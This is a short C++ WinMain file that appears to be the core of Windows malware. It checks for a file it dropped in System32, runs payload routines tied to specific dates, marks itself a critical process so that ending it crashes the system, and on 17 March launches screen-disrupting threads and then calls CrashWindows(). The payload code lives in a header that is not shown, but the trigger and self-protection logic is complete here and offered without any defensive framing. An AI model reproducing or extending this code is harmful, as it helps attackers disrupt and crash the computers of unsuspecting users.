#include <Windows.h>
#include <fstream>
#include "payloads.h"
using namespace std;
/*100% best code organization 
nobody can beat me!!*/
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ifstream file;
    file.open("C:\\Windows\\System32\\dllhelper.exe");
    if (file) {
        SYSTEMTIME time;
        GetSystemTime(&time);
        all();
        if (time.wMonth == 3 && time.wDay == 13) {
            March13();
        }
        if (time.wMonth == 12 && time.wDay == 24) {
            December24();
        }
        if (time.wMonth == 3 && time.wDay == 4) {
            march4();
        }
        if (time.wMonth == 1 && time.wDay == 9) {
            January9(); 
        }
        if (time.wMonth == 1 && time.wDay == 24) {
            January24(); //buggy
        }
        if (time.wMonth == 3 && time.wDay == 17) {
            SetCriticalProcess();
            CreateThread(0, 0, dark, 0, 0, 0);
            CreateThread(0, 0, move, 0, 0, 0);
            Sleep(110000);
            CrashWindows();
        }
        SetCriticalProcess();
        while (true) {
            Sleep(1000);
        }
    }
    else {
        GetOsVersion();
    }
}

